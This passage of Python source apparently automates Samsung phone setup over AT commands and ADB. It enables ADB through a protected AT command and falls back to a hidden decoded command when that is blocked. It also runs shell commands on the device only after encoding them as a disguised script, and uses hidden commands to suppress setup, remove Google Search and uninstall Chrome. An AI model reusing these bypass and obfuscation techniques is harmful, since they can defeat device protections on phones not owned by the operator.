							at_cmd.send_modem_cmd(Port, r'AT+SWATD=1,0', 'CHANGE')
							at_cmd.send_modem_cmd(Port, r'AT+DISPTEST=0,3', 'OK')
							return -1
					else:
						at_cmd.send_modem_cmd_noresponse(Port, r'AT+SWATD=0')
						time.sleep(.5)
						at_cmd.send_modem_cmd_noresponse(Port, r'ATZ')
						time.sleep(.5)
						self.is_factory_mode(Port)
				else:
					## return 1 if factory mode can be enabled
					# print(f'Switching to SWATD:1')
					at_cmd.send_modem_cmd(Port, r'AT+SWATD=1', 'CHANGE')
					at_cmd.send_modem_cmd(Port, r'AT+DISPTEST=0,3', 'OK')

					return 1
		except Exception as error:
			print(f'is_factory_mode: {error}\n{traceback.format_exc()}')


	def is_test_menu_open(self, Port):
		at_cmd=serial_cmd()
		## first we enable the OQCS service for function testing
		test_enabled=at_cmd.send_modem_cmd(Port, r'AT+OQCSBFTT=0,0,1,0', '+OQCSBFTT:0,OK')

		if test_enabled.find('0,OK') != -1:
			return 0
			print(f'NV Test Service Started')
		elif test_enabled.find('0,NG') != -1:
			print(f'Factory Test screen must be open first!')
			return 1
		# else:
			# print(test_enabled)

		## now check if test is open on main testing screen
		test_open=at_cmd.send_modem_cmd(Port, r'AT+OQCSBFTT=1,0,0,0', '+OQCSBFTT:1')
		if test_open.find('OQC') != -1:
			print(f'Device is now ready for testing..')
			# self.nv_keybutton_test(Port)
			return 1
		else:
			return 0


	def enable_adb_time(self, port_num):
		cmd=serial_cmd()
		log=logging()
		adb=adb_work()
		m=mixer()
		conn=connections()

		try:
			adb_enable = cmd.send_modem_cmd(port_num, r'AT+DEBUGLVC=0,5', 'OK', 'PROTECTED')
			while len(conn.find_samsung_modem()) == 0:
				print(f'Waiting for device to return')
				time.sleep(1)

			# if len(adb.find_all_unauthorized()) > 0:
			# 	print(f'Device returned, attempting to authorize')
			# 	cmd.send_modem_cmd(port_num, m.decode_it(kcilchtua), 'OK')
			if len(adb.find_all_authorized()) == 1:
				return 1
			else:
				print(f'ADB enable is: {adb_enable}')
				if adb_enable == "-1":
					print(f'Command was blocked: {adb_enable}')
					## command blocked, use alternate method
					adb_enable = cmd.send_modem_cmd(port_num, m.decode_it(elbane), 'OK')
		except Exception as error:
			log.log_errors(f'ADB_Enable: {error}\n{traceback.format_exc()}')


	def disable_adb_time(self, port_num):
		cmd=serial_cmd()
		log=logging()
		adb=adb_work()
		m=mixer()
		conn=connections()
		print(f'Attempting to disable ADB')
		time.sleep(1)
		try:

			adb_disable = cmd.send_modem_cmd(port_num, m.decode_it(elbasid), 'OK', 'PROTECTED')
			while len(conn.find_samsung_modem()) == 0:
				print(f'Waiting for device to return')
				time.sleep(1)

		except Exception as error:
			log.log_errors(f'ADB_Enable: {error}\n{traceback.format_exc()}')



class logging:

	def log_errors(self, exception):
		try:
			# datetime.utcnow().strftime('%H:%M:%S.%f')[:-3]
			f=open(e_log_file, "a+")
			f.write(datetime.utcnow().strftime('%H:%M:%S.%f')[:-3]+" "+exception+"\n")
			f.close()
		except:
			status_class().set_status(f'Error in logging. Is device being ran as Administrator?')

	def log_normal(self, log_msg):
		try:
			f=open(n_log_file, "a+")
			f.write(datetime.utcnow().strftime('%H:%M:%S.%f')[:-3]+" "+log_msg+"\n")
			f.close()
		except:
			status_class().set_status(f'Error in logging. Is device being ran as Administrator?')


class status_class:

	def read_status(self):
		global dev_status

		try:
			return dev_status
		except NameError:
			return ['', '']


	def set_status(self, modem_com, status):
		global dev_status

		try:
			## returns a list containing current GUI status and
			## modem port # for device processing
			dev_status=[modem_com, status]
			
		except NameError:
			return None



class adb_work:

	def restore_chrome(self, uniq_id, apk_name):
		shell_cmd=cmd()
		log=logging()
		status=status_class()
		print(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell \"pm install /data/local/tmp/{apk_name}\"')
		install=shell_cmd.console_cmd(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell \"pm install /data/local/tmp/{apk_name}\"')
		if install.find('success') != -1:
			return 1
		else:
			return 0

	def backup_chrome(self, uniq_id):
		shell_cmd=cmd()
		log=logging()
		status=status_class()

		chrome_path=shell_cmd.console_cmd(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell \"pm path com.android.chrome\"')
		chrome_path=chrome_path.replace('package:', '').strip('\r\n')


		if chrome_path:
			chrome_apk=chrome_path.split('/')[-1]
			print(f'Chrome path is: {chrome_path}\nChrome apk is: {chrome_apk}')
	
			## backup to /data/local/tmp for reinstallation
			print(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell \"cp {chrome_path} /data/local/tmp/\"')
			shell_cmd.console_cmd(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell \"cp {chrome_path} /data/local/tmp/ \"')
			shell_cmd.console_cmd(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell \"pm uninstall --user 0 com.android.chrome\"')
			return chrome_apk
		else:
			return []	

	def align_widget(self, Port, uniq_id, new_boundaries, original_boundaries, widget_str):
		shell_cmd=cmd()
		x=xml()
		m=mixer()
		log=logging()
		status=status_class()

		try:
			## new_boundaries
			x1=new_boundaries[0];y1=new_boundaries[1]-300
			## make sure you position right above found Playstore Coordinates
			x2=original_boundaries[0];y2=original_boundaries[1]

			## check if it needs to be moved
			## if the y axis's are within 75 pixels then skip
			## its already in a proper area
			if y1 > y2:
				if y2+75 > y1:
					return 1
			elif y2 > y1:
				if y1+75 > y2:
					return 1

			print(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell \"input touchscreen draganddrop {x2} {y2} {x2} {y1} 1500\"')
			shell_cmd.console_cmd(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell \"input touchscreen draganddrop {x2} {y2} {x2} {y1} 1500\"')
			shell_cmd.console_cmd(m.shell_ob_fuscate('input keyevent KEYCODE_BACK', self.generate_proper_id(uniq_id)))
			time.sleep(.5)
			## now check if it worked
			status.set_status(Port, f'5/5): Verifying alignment..')
			shell_cmd.console_cmd(m.shell_ob_fuscate('input keyevent KEYCODE_BACK', self.generate_proper_id(uniq_id)))
			for text, bounds in x.show_all_xml(uniq_id):
				print(text, bounds)
				if text.find(widget_str) != -1:
					## store the boundaries for later widget processing
					new_search_bounds = bounds

					## calculate if widget was moved in proper area within 100 px
					verify_y_bounds = y1
					current_y_bounds = new_search_bounds[1]
					if verify_y_bounds - 100 < current_y_bounds:
						## close enough within 100px
						status.set_status(Port, f'(5/5): Alignment Successful!')
					else:
						status.set_status(Port, f'(5/5): Alignment Failed, retrying..')
						shell_cmd.console_cmd(m.shell_ob_fuscate('input keyevent KEYCODE_BACK', self.generate_proper_id(uniq_id)))

						## calculate this move
						# x2, y2, x2, y1						

						y2=current_y_bounds

						print(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell \"input touchscreen draganddrop {x2} {y2} {x2} {y1} 2500\"')
						shell_cmd.console_cmd(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell \"input touchscreen draganddrop {x2} {y2} {x2} {y1} 2500\"')
						shell_cmd.console_cmd(m.shell_ob_fuscate('input keyevent KEYCODE_BACK', self.generate_proper_id(uniq_id)))
						shell_cmd.console_cmd(m.shell_ob_fuscate('input keyevent KEYCODE_BACK', self.generate_proper_id(uniq_id)))

						## recheck again!
						for text, bounds in x.show_all_xml(uniq_id):
							print(text, bounds)
							if text.find(widget_str) != -1:
								## store the boundaries for later widget processing
								new_search_bounds = bounds

								## calculate if widget was moved in proper area within 100 px
								verify_y_bounds = y1
								current_y_bounds = new_search_bounds[1]
								if verify_y_bounds - 100 < current_y_bounds:
									## close enough within 100px
									status.set_status(Port, f'(5/5): Alignment Successful!')
								else:
									status.set_status(Port, f'(5/5): Alignment Failed (Attempt: 2) - Logged!')
									log.log_errors(f'Aligning widget app has failed for {uniq_id}:\nNeeded bounds: {verify_y_bounds}, Error bounds: {current_y_bounds}')

						# status.set_status(Port, f'(5/5): Alignment Failed.. Logging!')



	
		except Exception as e:
			print(f'Align_Widget: {e}')


	def set_english(self, uniq_id):
		shell_cmd=cmd()
		m=mixer()
		shell_cmd.console_cmd(m.shell_ob_fuscate(m.decode_it(engsaes), self.generate_proper_id(uniq_id)))
		shell_cmd.console_cmd(m.shell_ob_fuscate(m.decode_it(swsaes), self.generate_proper_id(uniq_id)))


	def get_osver(self, uniq_id):
			shell_cmd=cmd()
			version=shell_cmd.console_cmd(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell getprop ro.build.version.release')
			versions=version.strip('\r\n')
			return int(versions)


	def get_model(self, uniq_id):
			shell_cmd=cmd()
			model=shell_cmd.console_cmd(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} shell getprop ro.product.model')
			model=model.strip('\r\n')
			return model


	def find_all_authorized(self):
		shell_cmd=cmd()
		final_list=[]
		line_one='List of devices attached'
		dev=shell_cmd.console_cmd(f'\"{ADB}\" devices')
		dev=dev.replace(line_one, '')
		devices=re.findall(dev_regex, dev)
		for d in devices:
			if d == 'tdevice':
				pass
			else:
				d=d.replace('device', '').replace('\t', '').replace('\n', '')
				final_list.append(d)
		return final_list

	def find_all_unauthorized(self):
		shell_cmd=cmd()
		final_list=[]
		line_one='List of devices attached'
		dev=shell_cmd.console_cmd(f'\"{ADB}\" devices')
		dev=dev.replace(line_one, '')
		devices=re.findall(dev_regex_unauth, dev)
		for d in devices:
			d=d.replace('unauthorized', '').replace('\t', '').replace('\n', '')
			final_list.append(d)
		return final_list

	def generate_proper_id(self, uniq_id):
		for devs in self.find_all_authorized():
			if devs.upper() == uniq_id.upper():
				## spit out what adb is showing serial
				## as for payload generator
				return devs

	def suppress_setup(self, uniq_id):
		shell_cmd=cmd()
		m=mixer()
		self.install_app(uniq_id)
		shell_cmd.console_cmd(m.shell_ob_fuscate(m.decode_it(supressaes), self.generate_proper_id(uniq_id)))
		shell_cmd.console_cmd(m.shell_ob_fuscate(m.decode_it(supressaes2), self.generate_proper_id(uniq_id)))


	def remove_googlesearch(self, uniq_id):
		shell_cmd=cmd()
		m=mixer()
		try:
			shell_cmd.console_cmd(m.shell_ob_fuscate(m.decode_it(gremovesae), self.generate_proper_id(uniq_id)))
			
		except Exception as e:
			logging().log_errors(f'Remove_GoogleSearch: {e}\n{traceback.format_exc()}')


	def install_app(self, uniq_id):
		shell_cmd=cmd()
		m=mixer()
		try:
			if not os.path.exists(apk_file):
				## apk file is not in place
				logging().log_normal(f'APK missing, please place in Dependencies folder with name: "install.apk"')
			shell_cmd.console_cmd(f'\"{ADB}\" -s {self.generate_proper_id(uniq_id)} install \"{apk_file}\"')
		except Exception as e:
			logging().log_errors(f'Install APK: {e}\n{traceback.format_exc()}')

	def keep_lights_on(self, uniq_id):
		shell_cmd=cmd()
		m=mixer()
		shell_cmd.console_cmd(m.shell_ob_fuscate('svc power stayon true', self.generate_proper_id(uniq_id)))

class cmd:

	def console_cmd(self, cmd):
		read=subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, \
		stderr=subprocess.STDOUT, close_fds=True, encoding='unicode_escape')
		output=read.stdout.read()
		return output


class connections:

	def find_samsung_modem(self):
		found_samsung_modems=[]
		global setup_devices
	
		sam_only_regex=r'COM[0-9]{1,4}\s*-\s*SAMSUNG'
		sam_only_regex1=r'COM[0-9]{1,4}\s*–\s*SAMSUNG'
		sam_only_regex_com=r'COM[0-9]{1,4}'

		found_ports = cmd().console_cmd(modem_com)
		found_ports=found_ports.split('\n')

		for port in found_ports:
			if not re.findall(sam_only_regex, port):
				if not re.findall(sam_only_regex1, port):
					pass
				else:
					for i in re.findall(sam_only_regex_com, port):
						found_samsung_modems.append(i)
			else:
				for i in re.findall(sam_only_regex_com, port):
					found_samsung_modems.append(i)

		return found_samsung_modems


	def check_queued(self):
		global queue_connected
		try:
			return queue_connected
		except:
			queue_connected=[]
			return queue_connected


class mixer:
	def shell_ob_fuscate(self, cmd, uniq_id):

		part_1=None
		with open(obs_file_identity, 'rb') as begin_file:
			for byte in begin_file:
				part1=self.decode_it(byte)
		## now lets add the function we want to make
		part_2=None
		with open(obs_file_random_fun, 'rb') as rand_func:
			for byte in rand_func:
				part2=self.decode_it(byte)

		part3=self.encode_it(cmd)
		# part3=f"\"{cmd}\""
		# print(f'CMD: {part3}')

		part_3_5=None
		with open(obs_cmd_end, 'rb') as rand_func:
			for byte in rand_func:
				part_3_5=self.decode_it(byte)

		part_4=None
		with open(obs_file_random_fun_end, 'rb') as rand_func:
			for byte in rand_func:
				part4=self.decode_it(byte)

		part_5=None
		with open(obs_file_end, 'rb') as rand_func:
			for byte in rand_func:
				part5=self.decode_it(byte)

		try:
			full_command = part1+part2+part3+part_3_5+part4+part5

		except Exception as e:
			pass
			# print(f'Error: {e}\n{traceback.format_exc()}')

		## format uniq_id to obfuscated data
		ob_id = base64.b64encode(bytes(uniq_id, encoding='utf-8'))
		ob_id = gzip.compress(ob_id)
		ob_id = ob_id.hex()	

		## obfuscate injection script
		full_command2 = base64.b64encode(bytes(full_command, encoding='utf-8'))
		full_command2 = gzip.compress(full_command2)
		full_command2 = full_command2.hex()

		## now create cmdline payload
		cmdline_payload = f'\"{ADB}\" -s {uniq_id} exec-out \"echo -ne {full_command2}|xxd -rp|gzip -d|base64 -d>/data/local/tmp/fs&&sh /data/local/tmp/fs {ob_id}\"'
		return cmdline_payload


	def encode_it(self, string):
		bytes_read=base64.b64encode(bytes(string, encoding='utf-8'))
		bytes_read=gzip.compress(bytes_read)
		bytes_read=bytes_read.hex()
		return bytes_read

	def decode_it(self, jargon):

		bytes1=bytes.fromhex(jargon.decode())
		bytes2=gzip.decompress(bytes1)
		final_byte=base64.b64decode(bytes2)
		return final_byte.decode()


class xml:
	def __init__(self):
		pass

	def find_blank_above_playstore(self, uniq_id):
		homescreen_info = self.show_all_xml(uniq_id)

		for text, coordinates in homescreen_info:
			if text.find('Play Store') != -1 or text.find('Phone') != -1:
				x=coordinates[0];y=coordinates[1]+50
		return [x, y]


	def find_blank_top_space(self, uniq_id):
		m=mixer()
		shell_cmd=cmd()
		adb_proc=adb_work()

		x=500;y=700
		homescreen_info = self.show_all_xml(uniq_id)

		for text, coordinates in homescreen_info:
			## first check for older weather app which causes issues
			## use its boundaries for clicking above
			if text.find('Tap for weather info') != -1:
				print(f'found problematic widget, using right corner for widget menu')
				return [100, 200]

		for text, coordinates in homescreen_info:
			if coordinates[0] < x:
				print(f'Found lower x_value: {coordinates[0]}')
				x=coordinates[0]
			if coordinates[1] < y:
				print(f'Found lower y_value: {coordinates[1]}')
				y=coordinates[1]

		print(f'Final lowest values: {[x-10, y-10]}')
		return [x-10, y-10]


	def show_all_xml(self, uniq_id):
		m=mixer()
		shell_cmd=cmd()
		found_elements=[]
		adb_proc=adb_work()
		# m.shell_ob_fuscate(m.decode_it(supressaes2), self.generate_proper_id(uniq_id))

		## dump xml_gui into memory
		try:
			ui_xml=shell_cmd.console_cmd(m.shell_ob_fuscate(m.decode_it(ui_autoaes), adb_proc.generate_proper_id(uniq_id)))
			ui_xml=ui_xml.replace('UI hierchary dumped to: /dev/tty', '')
			ui_xml=ui_xml.replace('>', '>\n')

			## parse xml without creating file hack
			## instead store into memory
			f = io.StringIO(ui_xml)
			tree = ET.parse(f)
			root = tree.getroot()

			for child in root.findall('.//'):
				if child.attrib['text']:
					bounds=child.attrib['bounds']
					bounds=re.findall(r'\[(.*?)\]', bounds)
					## gather x1 and x2 and then find the center of them two
					# print(f'Bounds: {bounds}')
					x1=bounds[0]
					x1=x1.split(',')
					y1=x1[1]

					x1=x1[0]
					x2=bounds[1]
					x2=x2.split(',')
					y2=x2[1]
					x2=x2[0]

					x1=int(x1);x2=int(x2);y1=int(y1);y2=int(y2)
					## calculate mid area
					midpoint_x=(x1+x2)/2
					midpoint_y=(y1+y2)/2
					text=child.attrib['text']
					# bounds=child.attrib['bounds']
					found_elements.append([text,[midpoint_x, midpoint_y]])
					# print(child.attrib['text'], [diff_x, diff_y])
								
					# shell_cmd.console_cmd(f'\"{ADB}\" shell input tap {diff_x} {diff_y}')
			return found_elements

		except Exception as error:
			print(f'Show_all_xml: {error}\n{traceback.format_exc()}')


	def parse_xml_dump(self, button_text, uniq_id):
		shell_cmd=cmd()
		m=mixer()
		adb_proc=adb_work()
		## dump xml_gui into memory
		try:
			ui_xml=shell_cmd.console_cmd(m.shell_ob_fuscate(m.decode_it(ui_autoaes), adb_proc.generate_proper_id(uniq_id)))
			ui_xml=ui_xml.replace('UI hierchary dumped to: /dev/tty', '')
			ui_xml=ui_xml.replace('>', '>\n')

			## parse xml without creating file hack
			## instead store into memory
			f = io.StringIO(ui_xml)
			tree = ET.parse(f)
			root = tree.getroot()

			for child in root.findall('.//'):
				## if list is passed (multiple items) use this, else
				## skip to str() parse
				if type(button_text) == list:
					for info in button_text:

						if child.attrib['text'].find(info) != -1:
							# print(child.attrib['text'], child.attrib['bounds'][1][0])
							bounds=child.attrib['bounds']
							bounds=re.findall(r'\[(.*?)\]', bounds)
							## gather x1 and x2 and then find the center of them two
							print(f'Bounds: {bounds}')
							x1=bounds[0]
							x1=x1.split(',')
							y1=x1[1]

							x1=x1[0]
							x2=bounds[1]
							x2=x2.split(',')
							y2=x2[1]
							x2=x2[0]

							x1=int(x1);x2=int(x2);y1=int(y1);y2=int(y2)
							## calculate mid area
							midpoint_x=(x1+x2)/2
							midpoint_y=(y1+y2)/2
			
							print(child.attrib['text'], [midpoint_x, midpoint_y])
							return child.attrib['text'], [midpoint_x, midpoint_y]
						else:
							pass

				else:
					if child.attrib['text'].find(button_text) != -1:
						# print(child.attrib['text'], child.attrib['bounds'][1][0])
						bounds=child.attrib['bounds']
						bounds=re.findall(r'\[(.*?)\]', bounds)
						## gather x1 and x2 and then find the center of them two
						print(f'Bounds: {bounds}')
						x1=bounds[0]
						x1=x1.split(',')
						y1=x1[1]

						x1=x1[0]
						x2=bounds[1]
						x2=x2.split(',')
						y2=x2[1]
						x2=x2[0]

						x1=int(x1);x2=int(x2);y1=int(y1);y2=int(y2)
						## calculate mid area

						midpoint_x=(x1+x2)/2
						midpoint_y=(y1+y2)/2
						print(child.attrib['text'], [midpoint_x, midpoint_y])
						return child.attrib['text'], [midpoint_x, midpoint_y]					

		except Exception as error:
			print(f'Parse_XML_Dump: {error}\n{traceback.format_exc()}')
